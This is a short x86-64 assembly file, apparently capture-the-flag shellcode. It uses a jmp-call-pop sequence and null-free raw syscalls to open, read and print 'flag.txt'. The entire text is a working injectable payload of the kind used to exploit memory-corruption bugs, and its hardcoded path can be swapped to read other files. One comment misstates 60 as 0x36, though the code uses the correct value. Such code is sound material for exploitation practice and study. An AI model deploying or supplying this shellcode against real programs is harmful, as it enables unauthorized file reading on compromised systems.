; bin

BITS 64

section .text

_start:
	jmp FN
ORW:
	pop rdi ; Pop path

	; Open file
	xor rax, rax
	add al, 0x2 ; Open syscall is 0x2
	xor rsi, rsi ; O_RDONLY flag is 0x0
	syscall

	; Read file
	sub sp, 0x20 ; Get stack space
	mov rdi, rax ; Input file descriptor
	lea rsi, [rsp] ; Just write to the stack.  Very good practice
	xor rdx, rdx
	mov dx, 0x20 ; Number of bytes to read
	xor rax, rax ; Read syscall is 0x0
	syscall

	; Write flag
	mov rsi, rsp ; Read from stack
	xor rdi, rdi
	mov edi, 0x1 ; Write to stdout
	mov rdx, rax ; Number of bytes
	xor rax, rax
	add al, 0x1 ; Write syscall is 0x1
	syscall

	; Exit
	xor rax, rax
	add al, 0x3c ; Exit syscall is 60 = 0x36
	syscall
FN:
	call ORW
	db "flag.txt", 0
section .data
